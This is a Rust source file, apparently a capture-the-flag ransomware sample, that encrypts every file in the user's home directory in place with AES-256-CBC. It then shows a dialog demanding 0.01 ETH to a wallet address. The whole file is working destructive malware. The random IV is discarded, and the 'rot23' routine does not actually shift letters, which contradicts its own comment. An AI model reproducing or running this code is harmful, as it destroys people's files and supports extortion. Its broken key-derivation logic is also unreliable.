use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use std::fs;
use std::io::{Read, Write};
use std::path::Path;
use rand::Rng;
use std::fs::File;
use dirs::home_dir;
use dialog::DialogBox;

type Aes256Cbc = Cbc<Aes256, Pkcs7>;

fn main() {
    let hash = b"KFdps{3013d874hi2hd3g2619988e3i}";
    let key = rot23(hash); // HCamp{3013a874ef2ea3d2619988b3f}
    let iv = generate_iv();

    let dir_path = home_dir().expect("Could not find home directory");

    match encrypt_directory(&dir_path, &key, &iv) {
        Ok(_) => {
            println!("Directory encrypted successfully.");
            dialog::Message::new("Your files have been encrypted. Send 0.01 ETH to 0x1267d627432ae68AFfbB9Db1b553E7398691CE43 to get the decryption key")
                .title("h3h3")
                .show()
                .expect("Failed to show dialog");
        }
        Err(e) => eprintln!("Failed to encrypt directory: {}", e),
    }
}

fn generate_iv() -> [u8; 16] {
    let mut iv = [0u8; 16];
    let mut rng = rand::thread_rng();
    rng.fill(&mut iv);
    iv
}

fn rot23(input: &[u8]) -> Vec<u8> {
    input.iter().map(|&x| match x {
        b'a'..=b'z' => ((x - b'a') % 26 + b'a') as u8,
        b'A'..=b'Z' => ((x - b'A') % 26 + b'A') as u8,
        _ => x,
    }).collect()
}

fn encrypt_directory<P: AsRef<Path>>(dir: P, key: &[u8], iv: &[u8]) -> std::io::Result<()> {
    for entry in fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();

        if path.is_file() {
            let mut file = File::open(&path)?;
            let mut buffer = Vec::new();
            file.read_to_end(&mut buffer)?;

            let cipher = Aes256Cbc::new_from_slices(key, iv).unwrap();
            let ciphertext = cipher.encrypt_vec(&buffer);

            let mut encrypted_file = File::create(&path)?;
            encrypted_file.write_all(&ciphertext)?;
        }
    }
    Ok(())
}
